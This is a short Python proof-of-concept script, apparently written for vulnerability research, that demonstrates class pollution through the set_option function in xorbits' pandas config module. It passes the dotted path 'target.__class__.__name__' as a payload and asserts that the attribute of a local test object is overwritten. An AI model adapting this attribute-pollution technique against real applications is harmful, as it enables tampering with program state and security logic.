# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_option
# Type: get-attr-set-attr

from functools import reduce
import xorbits

class Target: pass
target = Target()
xorbits.pandas._config.config.xorbits_options = type("Opts", (), {"target": target})()

payload_value = "pwnd"
PAYLOAD = "target.__class__.__name__"

def run_poc():
  from xorbits.pandas._config.config import set_option
  set_option(PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
